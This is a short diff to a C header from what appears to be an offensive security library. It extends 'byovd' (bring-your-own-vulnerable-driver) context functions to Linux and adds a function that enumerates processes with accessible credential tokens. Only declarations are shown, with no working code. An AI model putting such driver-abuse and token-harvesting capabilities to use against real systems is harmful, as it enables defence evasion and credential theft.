@@ -497,14 +497,14 @@ void* jocky_alloc(int64_t size);
 /* Free a buffer previously returned by jocky_alloc. No-op on NULL. */
 void  jocky_free(void* ptr);
 
-#ifdef _WIN32
-/* Allocate a zeroed jocky_byovd_t context (opaque pointer; use with
- * jocky_byovd_load / jocky_byovd_unload / jocky_byovd_destroy). */
+/* Allocate a zeroed byovd context. Windows: jocky_byovd_t; Linux: byovd_context_t. */
 int8_t* jocky_byovd_new(void);
-
-/* Call jocky_byovd_unload() and then free the context. Safe on NULL. */
+/* Unload and free the context. Safe on NULL. */
 void  jocky_byovd_destroy(int8_t* ctx);
-#endif
+
+/* Enumerate PIDs with accessible tokens/credentials.
+ * Returns a malloc'd int32_t[] terminated by 0, or NULL on failure. */
+int32_t* jocky_token_enumerate(void);
 
 /* ============================================================================
  * Crypto: String / Data Decryption
